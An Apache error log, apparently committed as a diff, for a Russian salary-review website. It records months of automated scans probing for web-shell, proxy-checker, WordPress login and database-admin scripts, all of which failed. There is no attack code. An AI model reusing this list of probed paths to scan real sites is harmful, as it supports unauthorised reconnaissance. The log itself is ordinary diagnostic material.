+[Sun Mar 31 07:21:35.149842 2019] [php7:error] [pid 9298] [client 83.217.8.122:35753] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Sun Mar 31 19:04:57.049354 2019] [php7:error] [pid 9304] [client 176.215.56.21:60225] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Tue Apr 02 09:36:14.847917 2019] [php7:error] [pid 30578] [client 149.129.50.37:43792] script '/var/www/banks.obzorzarplat.ru/docs/public/proxyjudge.php' not found or unable to stat
+[Tue Apr 02 14:19:10.971058 2019] [php7:error] [pid 30575] [client 127.0.0.1:46564] script '/var/www/banks.obzorzarplat.ru/docs/public/webconfig.txt.php' not found or unable to stat, referer: http://www.google.com.hk
+[Tue Apr 02 14:19:16.973007 2019] [php7:error] [pid 30576] [client 127.0.0.1:46584] script '/var/www/banks.obzorzarplat.ru/docs/public/webconfig.txt.php' not found or unable to stat, referer: http://www.google.com.hk
+[Tue Apr 02 19:44:41.634539 2019] [php7:error] [pid 30580] [client 176.215.56.21:52245] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Wed Apr 03 14:14:18.589922 2019] [php7:error] [pid 13208] [client 180.76.244.220:58146] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Apr 04 02:44:01.682435 2019] [php7:error] [pid 12730] [client 83.217.8.122:58714] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Sun Apr 07 16:58:07.261029 2019] [php7:error] [pid 18590] [client 134.175.229.210:56814] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Apr 10 06:36:40.936337 2019] [php7:error] [pid 8138] [client 176.212.147.167:62185] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Mon Apr 15 03:07:33.624865 2019] [php7:error] [pid 12842] [client 176.32.33.145:36826] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Mon Apr 15 03:11:12.819220 2019] [php7:error] [pid 12841] [client 127.0.0.1:54086] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Wed Apr 17 02:15:11.643238 2019] [php7:error] [pid 15981] [client 176.32.33.145:47818] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Wed Apr 17 02:19:31.433315 2019] [php7:error] [pid 15975] [client 127.0.0.1:35268] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Wed Apr 17 17:35:39.565949 2019] [php7:error] [pid 28827] [client 127.0.0.1:49282] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat, referer: http://banks.obzorzarplat.ru/wp-login.php
+[Wed Apr 17 21:28:01.371486 2019] [php7:error] [pid 28824] [client 94.181.30.196:55112] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Fri Apr 19 02:05:38.723199 2019] [php7:error] [pid 7131] [client 127.0.0.1:33000] script '/var/www/banks.obzorzarplat.ru/docs/public/webconfig.txt.php' not found or unable to stat, referer: http://www.google.com.hk
+[Fri Apr 19 02:06:52.460740 2019] [php7:error] [pid 7129] [client 127.0.0.1:33030] script '/var/www/banks.obzorzarplat.ru/docs/public/webconfig.txt.php' not found or unable to stat, referer: http://www.google.com.hk
+[Fri Apr 19 02:07:09.604976 2019] [php7:error] [pid 7138] [client 127.0.0.1:33036] script '/var/www/banks.obzorzarplat.ru/docs/public/webconfig.txt.php' not found or unable to stat, referer: http://www.google.com.hk
+[Fri Apr 19 02:13:53.740732 2019] [php7:error] [pid 7130] [client 127.0.0.1:33158] script '/var/www/banks.obzorzarplat.ru/docs/public/webconfig.txt.php' not found or unable to stat, referer: http://www.google.com.hk
+[Mon Apr 22 10:02:00.533104 2019] [php7:error] [pid 24524] [client 193.192.37.183:14484] script '/var/www/banks.obzorzarplat.ru/docs/public/azenv.php' not found or unable to stat
+[Mon Apr 22 12:13:16.518242 2019] [php7:error] [pid 24523] [client 119.29.190.19:44502] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Apr 22 19:32:16.528551 2019] [php7:error] [pid 24522] [client 47.103.70.197:37188] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Apr 23 16:07:14.436831 2019] [php7:error] [pid 5276] [client 127.0.0.1:44634] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat, referer: http://banks.obzorzarplat.ru/wp-login.php
+[Wed Apr 24 14:57:55.866850 2019] [php7:error] [pid 19969] [client 149.129.50.37:37426] script '/var/www/banks.obzorzarplat.ru/docs/public/proxyjudge.php' not found or unable to stat
+[Thu Apr 25 14:48:21.870115 2019] [php7:error] [pid 11298] [client 127.0.0.1:50516] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Thu Apr 25 14:48:53.160038 2019] [php7:error] [pid 8173] [client 46.17.46.3:59996] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Thu Apr 25 15:14:09.627007 2019] [php7:error] [pid 8173] [client 46.17.46.3:36770] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Thu Apr 25 15:42:23.722078 2019] [php7:error] [pid 8174] [client 127.0.0.1:51100] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Thu May 02 14:13:48.472174 2019] [php7:error] [pid 6555] [client 176.120.25.160:57064] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Sat May 04 20:08:16.779020 2019] [php7:error] [pid 3484] [client 182.254.246.102:36858] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed May 08 12:15:31.911443 2019] [php7:error] [pid 25306] [client 95.213.187.186:39483] script '/var/www/banks.obzorzarplat.ru/docs/public/azenv.php' not found or unable to stat, referer: https://best-proxies.ru/
+[Wed May 08 15:25:31.169415 2019] [php7:error] [pid 25306] [client 95.213.187.186:11104] script '/var/www/banks.obzorzarplat.ru/docs/public/azenv.php' not found or unable to stat, referer: https://best-proxies.ru/
+[Fri May 10 00:20:02.932078 2019] [php7:error] [pid 6764] [client 5.165.112.164:51304] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Sat May 11 04:19:14.804562 2019] [php7:error] [pid 25412] [client 5.165.112.164:60110] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Mon May 13 00:45:10.104213 2019] [php7:error] [pid 20453] [client 134.249.139.91:56282] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Tue May 14 03:26:30.480876 2019] [php7:error] [pid 9839] [client 185.101.33.134:55116] script '/var/www/banks.obzorzarplat.ru/docs/public/admin.php' not found or unable to stat
+[Wed May 15 13:53:07.233722 2019] [php7:error] [pid 29275] [client 109.234.153.134:35112] script '/var/www/banks.obzorzarplat.ru/docs/public/azenv.php' not found or unable to stat, referer: https://best-proxies.ru/
+[Fri May 17 23:02:45.436626 2019] [php7:error] [pid 27350] [client 149.129.50.37:58652] script '/var/www/banks.obzorzarplat.ru/docs/public/proxyjudge.php' not found or unable to stat
+[Sun May 19 10:23:37.654185 2019] [php7:error] [pid 32712] [client 51.15.117.46:54965] script '/var/www/banks.obzorzarplat.ru/docs/public/chk_prx.php' not found or unable to stat
+[Sun May 19 15:54:22.145925 2019] [php7:error] [pid 32711] [client 51.15.117.46:49409] script '/var/www/banks.obzorzarplat.ru/docs/public/chk_prx.php' not found or unable to stat
+[Sun May 19 21:22:30.013905 2019] [php7:error] [pid 32711] [client 51.15.117.46:43559] script '/var/www/banks.obzorzarplat.ru/docs/public/chk_prx.php' not found or unable to stat
+[Mon May 20 02:54:04.521425 2019] [php7:error] [pid 32714] [client 51.15.117.46:21079] script '/var/www/banks.obzorzarplat.ru/docs/public/chk_prx.php' not found or unable to stat
+[Mon May 20 08:28:17.943836 2019] [php7:error] [pid 16024] [client 51.15.117.46:30801] script '/var/www/banks.obzorzarplat.ru/docs/public/chk_prx.php' not found or unable to stat
+[Fri May 24 06:29:32.738286 2019] [php7:error] [pid 30871] [client 5.188.210.101:28081] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Fri May 24 11:52:59.404210 2019] [php7:error] [pid 30866] [client 192.163.192.171:40082] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Sat May 25 10:35:17.414304 2019] [php7:error] [pid 22597] [client 127.0.0.1:60736] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat, referer: http://www.google.com.hk
+[Sat May 25 12:05:44.181531 2019] [php7:error] [pid 22599] [client 127.0.0.1:33146] script '/var/www/banks.obzorzarplat.ru/docs/public/xmlrpc.php' not found or unable to stat
+[Mon May 27 14:37:14.844538 2019] [php7:error] [pid 14822] [client 5.165.113.163:63260] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Thu May 30 04:19:04.902246 2019] [php7:error] [pid 16904] [client 83.217.8.122:41841] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Thu May 30 18:01:06.902278 2019] [php7:error] [pid 4427] [client 149.129.50.37:45559] script '/var/www/banks.obzorzarplat.ru/docs/public/proxyjudge.php' not found or unable to stat
+[Fri May 31 01:33:52.168938 2019] [php7:error] [pid 6864] [client 124.156.168.127:55534] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri May 31 07:28:21.244048 2019] [php7:error] [pid 15685] [client 5.188.210.101:55804] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sat Jun 01 11:46:44.035807 2019] [php7:error] [pid 27076] [client 127.0.0.1:55916] script '/var/www/banks.obzorzarplat.ru/docs/public/login.php' not found or unable to stat
+[Sat Jun 01 11:47:00.739485 2019] [php7:error] [pid 27080] [client 127.0.0.1:56136] script '/var/www/banks.obzorzarplat.ru/docs/public/652220abec55ba2d.php' not found or unable to stat
+[Sat Jun 01 11:47:00.889819 2019] [php7:error] [pid 27075] [client 127.0.0.1:56138] script '/var/www/banks.obzorzarplat.ru/docs/public/ee5e17589ffd43a5.php' not found or unable to stat
+[Sat Jun 01 11:48:06.681568 2019] [autoindex:error] [pid 27165] [client 127.0.0.1:56960] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.php,index.html,index.shtml,index.htm) found, and server-generated directory index forbidden by Options directive
+[Sat Jun 01 11:48:12.140695 2019] [autoindex:error] [pid 27075] [client 127.0.0.1:57026] AH01276: Cannot serve directory /usr/share/javascript/: No matching DirectoryIndex (index.php,index.html,index.shtml,index.htm) found, and server-generated directory index forbidden by Options directive
+[Sun Jun 02 13:55:23.656695 2019] [php7:error] [pid 8120] [client 127.0.0.1:41486] script '/var/www/banks.obzorzarplat.ru/docs/public/login.php' not found or unable to stat
+[Sun Jun 02 13:55:42.159815 2019] [php7:error] [pid 8121] [client 127.0.0.1:41708] script '/var/www/banks.obzorzarplat.ru/docs/public/2ac859b48fd01b72.php' not found or unable to stat
+[Sun Jun 02 13:55:42.326218 2019] [php7:error] [pid 8119] [client 127.0.0.1:41710] script '/var/www/banks.obzorzarplat.ru/docs/public/6038b48f36aa78c1.php' not found or unable to stat
+[Sun Jun 02 13:56:51.220368 2019] [autoindex:error] [pid 8119] [client 127.0.0.1:42544] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.php,index.html,index.shtml,index.htm) found, and server-generated directory index forbidden by Options directive
+[Sun Jun 02 13:56:56.521427 2019] [autoindex:error] [pid 8123] [client 127.0.0.1:42610] AH01276: Cannot serve directory /usr/share/javascript/: No matching DirectoryIndex (index.php,index.html,index.shtml,index.htm) found, and server-generated directory index forbidden by Options directive
+[Thu Jun 06 20:31:10.648900 2019] [php7:error] [pid 30568] [client 182.61.30.232:47404] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Jun 07 16:51:44.483027 2019] [php7:error] [pid 5711] [client 185.172.110.221:39662] script '/var/www/banks.obzorzarplat.ru/docs/public/proxy_get.php' not found or unable to stat
+[Sat Jun 08 02:40:48.416410 2019] [php7:error] [pid 5582] [client 5.188.210.101:60300] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sat Jun 08 16:03:32.005602 2019] [php7:error] [pid 30423] [client 39.106.32.236:49940] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Jun 10 02:33:01.559152 2019] [php7:error] [pid 13821] [client 95.163.214.184:59270] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Jun 11 15:30:30.086039 2019] [php7:error] [pid 25534] [client 123.206.62.95:55468] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Jun 11 16:14:28.199506 2019] [php7:error] [pid 25612] [client 127.0.0.1:34922] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat, referer: http://banks.obzorzarplat.ru/wp-login.php
+[Fri Jun 14 17:03:29.379683 2019] [php7:error] [pid 28735] [client 190.58.249.214:41366] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Jun 14 17:09:08.705748 2019] [php7:error] [pid 23824] [client 5.188.210.101:55741] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sat Jun 15 21:38:20.072067 2019] [php7:error] [pid 8540] [client 60.195.249.127:53156] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Jun 16 14:17:51.516344 2019] [php7:error] [pid 15236] [client 134.175.8.31:40192] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Jun 16 21:06:05.227288 2019] [php7:error] [pid 11973] [client 92.1.103.80:9140] script '/var/www/banks.obzorzarplat.ru/docs/public/ip4.php' not found or unable to stat, referer: http://www.sbjudge2.com
+[Sun Jun 16 21:06:05.404955 2019] [php7:error] [pid 11977] [client 92.1.103.80:9220] script '/var/www/banks.obzorzarplat.ru/docs/public/ip4.php' not found or unable to stat, referer: http://www.sbjudge2.com
+[Sun Jun 16 21:06:05.620174 2019] [php7:error] [pid 15236] [client 92.1.103.80:9304] script '/var/www/banks.obzorzarplat.ru/docs/public/ip4.php' not found or unable to stat, referer: http://www.sbjudge2.com
+[Sun Jun 16 21:06:06.380673 2019] [php7:error] [pid 12054] [client 92.1.103.80:9723] script '/var/www/banks.obzorzarplat.ru/docs/public/ip4.php' not found or unable to stat, referer: http://www.sbjudge2.com
+[Sun Jun 16 21:09:00.279572 2019] [php7:error] [pid 15236] [client 92.1.103.80:15559] script '/var/www/banks.obzorzarplat.ru/docs/public/ip4.php' not found or unable to stat, referer: http://www.sbjudge1.com
+[Sun Jun 16 21:09:00.610498 2019] [php7:error] [pid 12054] [client 92.1.103.80:15588] script '/var/www/banks.obzorzarplat.ru/docs/public/ip4.php' not found or unable to stat, referer: http://www.sbjudge1.com
+[Sun Jun 16 21:09:00.737020 2019] [php7:error] [pid 15238] [client 92.1.103.80:15608] script '/var/www/banks.obzorzarplat.ru/docs/public/ip4.php' not found or unable to stat, referer: http://www.sbjudge1.com
+[Sun Jun 16 21:09:01.339768 2019] [php7:error] [pid 11974] [client 92.1.103.80:15680] script '/var/www/banks.obzorzarplat.ru/docs/public/ip4.php' not found or unable to stat, referer: http://www.sbjudge1.com
+[Mon Jun 17 05:33:01.178977 2019] [php7:error] [pid 11974] [client 115.159.122.71:29181] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Jun 17 06:59:05.970615 2019] [php7:error] [pid 25170] [client 111.207.197.50:36356] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Jun 18 02:03:06.612625 2019] [php7:error] [pid 24928] [client 127.0.0.1:40826] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Tue Jun 18 11:37:40.327643 2019] [php7:error] [pid 3980] [client 176.120.25.160:34203] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Tue Jun 18 16:12:12.865492 2019] [php7:error] [pid 3980] [client 127.0.0.1:55098] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Wed Jun 19 18:57:41.442220 2019] [php7:error] [pid 12181] [client 185.97.201.121:6957] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Thu Jun 20 04:29:48.675732 2019] [php7:error] [pid 12181] [client 106.12.206.132:40638] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Jun 22 01:53:57.657739 2019] [php7:error] [pid 3501] [client 5.188.210.101:44861] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sat Jun 22 02:49:15.941117 2019] [php7:error] [pid 3503] [client 149.129.50.37:37938] script '/var/www/banks.obzorzarplat.ru/docs/public/proxyjudge.php' not found or unable to stat
+[Sat Jun 22 05:11:56.198230 2019] [php7:error] [pid 3503] [client 223.166.32.234:46907] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Sat Jun 22 05:12:24.134126 2019] [php7:error] [pid 3504] [client 127.0.0.1:50814] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: https://195.24.65.109/
+[Sat Jun 22 20:04:17.496419 2019] [php7:error] [pid 15047] [client 106.52.103.36:50782] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Jun 24 11:06:00.273730 2019] [php7:error] [pid 27766] [client 127.0.0.1:48366] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Tue Jun 25 14:33:33.298820 2019] [php7:error] [pid 8128] [client 61.191.49.133:49816] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Jun 26 06:33:33.563606 2019] [php7:error] [pid 15030] [client 130.61.18.164:59226] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Jun 26 15:52:04.948579 2019] [php7:error] [pid 15030] [client 119.29.18.114:58874] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Jun 27 09:32:24.476413 2019] [php7:error] [pid 27076] [client 118.25.134.144:49782] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Jun 27 12:51:27.936505 2019] [php7:error] [pid 27077] [client 106.14.29.3:60729] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Jun 27 23:47:07.388759 2019] [php7:error] [pid 27077] [client 127.0.0.1:53686] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Sat Jun 29 09:54:33.984675 2019] [php7:error] [pid 16282] [client 194.67.86.48:47232] script '/var/www/banks.obzorzarplat.ru/docs/public/azenv.php' not found or unable to stat, referer: https://www.google.com/
+[Sat Jun 29 10:49:56.266510 2019] [php7:error] [pid 16280] [client 180.101.253.161:35716] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Jun 29 18:53:06.004851 2019] [php7:error] [pid 18252] [client 5.188.210.101:21738] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sat Jun 29 20:31:50.016747 2019] [php7:error] [pid 18253] [client 127.0.0.1:57594] script '/var/www/banks.obzorzarplat.ru/docs/public/xmlrpc.php' not found or unable to stat
+[Mon Jul 01 14:39:04.687107 2019] [php7:error] [pid 18496] [client 149.129.50.37:57314] script '/var/www/banks.obzorzarplat.ru/docs/public/proxyjudge.php' not found or unable to stat
+[Wed Jul 03 23:47:58.419608 2019] [php7:error] [pid 20734] [client 203.158.27.2:54902] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Jul 05 02:21:16.006311 2019] [php7:error] [pid 28188] [client 127.0.0.1:51750] script '/var/www/banks.obzorzarplat.ru/docs/public/admin.php' not found or unable to stat
+[Fri Jul 05 09:44:17.516251 2019] [php7:error] [pid 10063] [client 127.0.0.1:54970] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Fri Jul 05 09:44:21.768612 2019] [php7:error] [pid 9791] [client 127.0.0.1:54974] script '/var/www/banks.obzorzarplat.ru/docs/public/blogswp-login.php' not found or unable to stat
+[Sat Jul 06 09:53:31.240191 2019] [php7:error] [pid 24086] [client 5.188.210.101:26367] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sun Jul 07 13:37:23.494398 2019] [php7:error] [pid 3348] [client 45.230.70.174:65446] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Jul 07 18:36:08.607454 2019] [php7:error] [pid 3351] [client 217.106.238.30:46578] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Tue Jul 09 18:00:09.881469 2019] [php7:error] [pid 17842] [client 144.34.157.116:36646] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Jul 10 06:03:38.675647 2019] [php7:error] [pid 17841] [client 182.50.115.98:46088] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Jul 11 07:56:57.164954 2019] [php7:error] [pid 1975] [client 139.162.79.87:50890] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat
+[Sat Jul 13 00:07:24.095080 2019] [php7:error] [pid 12495] [client 176.120.25.160:51312] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Sat Jul 13 00:31:59.403515 2019] [php7:error] [pid 12494] [client 127.0.0.1:54834] script '/var/www/banks.obzorzarplat.ru/docs/public/adminer.php' not found or unable to stat
+[Sat Jul 13 00:31:59.677689 2019] [php7:error] [pid 12248] [client 127.0.0.1:54836] script '/var/www/banks.obzorzarplat.ru/docs/public/db.php' not found or unable to stat
+[Sat Jul 13 00:31:59.957879 2019] [php7:error] [pid 12245] [client 127.0.0.1:54838] script '/var/www/banks.obzorzarplat.ru/docs/public/connect.php' not found or unable to stat
+[Sat Jul 13 00:32:00.233895 2019] [php7:error] [pid 12246] [client 127.0.0.1:54840] script '/var/www/banks.obzorzarplat.ru/docs/public/sql.php' not found or unable to stat
+[Sat Jul 13 00:32:00.498783 2019] [php7:error] [pid 12250] [client 127.0.0.1:54842] script '/var/www/banks.obzorzarplat.ru/docs/public/mysql.php' not found or unable to stat
+[Sat Jul 13 01:29:00.854004 2019] [php7:error] [pid 12245] [client 176.214.232.102:52405] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Sat Jul 13 06:37:45.149726 2019] [php7:error] [pid 30493] [client 5.188.210.101:49156] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Tue Jul 16 08:46:55.069892 2019] [php7:error] [pid 9393] [client 180.96.12.158:58008] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Jul 18 04:54:20.695347 2019] [php7:error] [pid 20672] [client 115.159.122.71:42289] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Jul 18 16:20:54.603948 2019] [php7:error] [pid 888] [client 180.101.249.129:47702] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Jul 19 00:45:29.904605 2019] [php7:error] [pid 578] [client 176.126.45.242:53022] script '/var/www/banks.obzorzarplat.ru/docs/public/main.php' not found or unable to stat, referer: http://195.24.65.109:8080/
+[Sat Jul 20 06:02:09.114741 2019] [php7:error] [pid 15351] [client 5.188.210.101:26529] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sat Jul 20 15:43:19.651279 2019] [php7:error] [pid 30181] [client 115.159.122.71:41029] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Jul 21 04:53:31.717251 2019] [php7:error] [pid 349] [client 39.107.92.214:50441] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Jul 22 06:00:56.673520 2019] [php7:error] [pid 9835] [client 203.154.59.241:40770] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Mon Jul 22 16:57:01.034366 2019] [php7:error] [pid 20410] [client 127.0.0.1:50588] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Fri Jul 26 14:54:53.718880 2019] [php7:error] [pid 16801] [client 83.217.8.122:60893] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Fri Jul 26 18:28:17.512508 2019] [php7:error] [pid 16858] [client 103.244.2.103:56534] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sat Jul 27 22:25:06.192919 2019] [php7:error] [pid 32723] [client 5.188.210.101:52982] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sun Jul 28 06:34:53.010214 2019] [php7:error] [pid 14108] [client 127.0.0.1:51246] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Sun Jul 28 10:41:25.665607 2019] [authz_core:error] [pid 14108] [client 27.115.124.6:3352] AH01630: client denied by server configuration: /var/www/banks.obzorzarplat.ru/docs/public/server-status, referer: http://www.baidu.com
+[Mon Jul 29 00:11:30.032387 2019] [php7:error] [pid 14109] [client 129.28.197.124:37714] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Jul 30 04:44:34.987703 2019] [php7:error] [pid 8185] [client 5.189.182.20:62236] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Jul 31 10:18:48.775841 2019] [php7:error] [pid 20071] [client 193.112.8.226:37820] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Wed Jul 31 11:39:06.308101 2019] [php7:error] [pid 20309] [client 139.155.135.144:37382] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Fri Aug 02 01:59:35.554712 2019] [authz_core:error] [pid 28102] [client 111.206.59.142:10306] AH01630: client denied by server configuration: /var/www/banks.obzorzarplat.ru/docs/public/server-status, referer: http://www.baidu.com
+[Fri Aug 02 02:37:18.028283 2019] [authz_core:error] [pid 28102] [client 27.115.124.6:17411] AH01630: client denied by server configuration: /var/www/banks.obzorzarplat.ru/docs/public/server-status, referer: http://www.baidu.com
+[Sat Aug 03 12:30:46.243722 2019] [authz_core:error] [pid 13071] [client 27.115.124.70:46866] AH01630: client denied by server configuration: /var/www/banks.obzorzarplat.ru/docs/public/server-status, referer: http://www.baidu.com
+[Sat Aug 03 19:33:49.918227 2019] [php7:error] [pid 13069] [client 5.188.210.101:41699] script '/var/www/banks.obzorzarplat.ru/docs/public/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Sun Aug 04 05:07:00.434497 2019] [php7:error] [pid 13074] [client 94.191.92.44:52896] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Sun Aug 04 11:54:17.838621 2019] [php7:error] [pid 21055] [client 127.0.0.1:56566] script '/var/www/banks.obzorzarplat.ru/docs/public/wp-login.php' not found or unable to stat
+[Sun Aug 04 18:47:38.809636 2019] [php7:error] [pid 25162] [client 127.0.0.1:60114] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
+[Mon Aug 05 22:49:31.641772 2019] [php7:error] [pid 29652] [client 47.252.87.123:46972] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Tue Aug 06 11:36:47.236676 2019] [php7:error] [pid 4786] [client 183.131.18.171:19492] script '/var/www/banks.obzorzarplat.ru/docs/public/elrekt.php' not found or unable to stat
+[Thu Aug 08 02:35:24.880125 2019] [php7:error] [pid 16455] [client 83.217.8.122:46205] script '/var/www/banks.obzorzarplat.ru/docs/public/prox_ch.php' not found or unable to stat
+[Thu Aug 08 11:27:31.499944 2019] [authz_core:error] [pid 23074] [client 27.115.124.6:38394] AH01630: client denied by server configuration: /var/www/banks.obzorzarplat.ru/docs/public/server-status, referer: http://www.baidu.com
+[Fri Aug 09 02:47:46.488190 2019] [php7:error] [pid 28071] [client 77.247.110.186:33300] script '/var/www/banks.obzorzarplat.ru/docs/public/about.php' not found or unable to stat
